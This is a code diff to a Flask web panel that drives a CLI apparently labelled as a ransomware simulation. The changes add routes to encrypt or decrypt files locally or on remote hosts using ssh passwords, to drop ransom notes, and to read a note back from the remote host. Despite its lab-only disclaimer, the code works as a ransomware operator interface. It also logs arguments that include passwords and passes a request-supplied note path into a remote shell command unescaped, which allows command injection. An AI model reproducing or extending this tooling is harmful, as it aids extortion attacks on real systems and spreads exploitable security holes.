@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 """
-0xPo11 Control Panel — Flask web UI for the ransomware simulation CLI.
+0xPo11 ****Control Panel****.
 
 SIMULATION ONLY. Authorized lab systems only. No real payments, no network
 propagation, and no destructive automation outside targets you own or have
@@ -21,28 +21,33 @@ command that would have run.
 from __future__ import annotations
 
 import shlex
+import shutil
 import subprocess
 from pathlib import Path
 from typing import List
+import os
 
 from flask import Flask, jsonify, render_template, request
 
 app = Flask(__name__, template_folder="templates")
 
-KEY_BIN = shutil.which("key") if (shutil := __import__("shutil")) else None
-if not KEY_BIN:
-    KEY_BIN = "key"
+KEY_BIN = os.path.expanduser("~/.local/bin/key")
+if not os.path.exists(KEY_BIN):
+    KEY_BIN = shutil.which("key") or "key"
 
 
 def run_key(args: List[str]) -> str:
     """Run the `key` CLI with the given arguments and return captured output."""
     cmd = [KEY_BIN] + args
+    run_env = dict(os.environ)
+    run_env.setdefault("HOME", str(Path.home()))
     try:
         proc = subprocess.run(
             cmd,
             capture_output=True,
             text=True,
             timeout=60,
+            env=run_env,
         )
         out = proc.stdout or ""
         err = proc.stderr or ""
@@ -73,7 +78,7 @@ def run_fe():
     local_in = body.get("localIn", False)
     local_out = body.get("localOut", False)
 
-    args: List[str] = []
+    args: List[str] = ["fe"]
     if mode == "decrypt":
         args.append("-d")
     else:
@@ -91,6 +96,7 @@ def run_fe():
     return jsonify({"output": run_key(args)})
 
 
+
 @app.post("/run/note")
 def run_note():
     body = request.get_json(force=True) or {}
@@ -101,6 +107,7 @@ def run_note():
     output_path = body.get("output", "")
 
     args = [
+        "rn",
         "-e",
         "-i",
         input_path,
@@ -131,7 +138,7 @@ def run_remote():
     local_in = body.get("localIn", False)
     local_out = body.get("localOut", False)
 
-    args: List[str] = []
+    args: List[str] = ["fe"]
     if direction.startswith("decrypt"):
         args.append("-d")
     else:
@@ -147,23 +154,31 @@ def run_remote():
         password,
         "--timeout",
         timeout,
-        "--local-out",
     ]
+    if local_in:
+        args.append("--local-in")
+    if local_out:
+        args.append("--local-out")
     if drop:
         args += ["--drop-note", note_tmpl, "--note-out", note_path]
 
     output = run_key(args)
+    app.logger.debug("RAN: key %s", " ".join(args))
+    app.logger.debug("OUTPUT: %s", output[:500])
     result: dict = {"output": output}
 
     # If encryption succeeded and a note was dropped, cat it from the remote host.
     if drop and not direction.startswith("decrypt") and "failed" not in output.lower():
         note_cmd = ["ssh", host, f"cat '{note_path}'"]
+        ssh_env = dict(os.environ)
+        ssh_env.setdefault("HOME", str(Path.home()))
         try:
             proc = subprocess.run(
                 note_cmd,
                 capture_output=True,
                 text=True,
                 timeout=30,
+                env=ssh_env,
             )
             if proc.returncode == 0:
                 result["note"] = proc.stdout
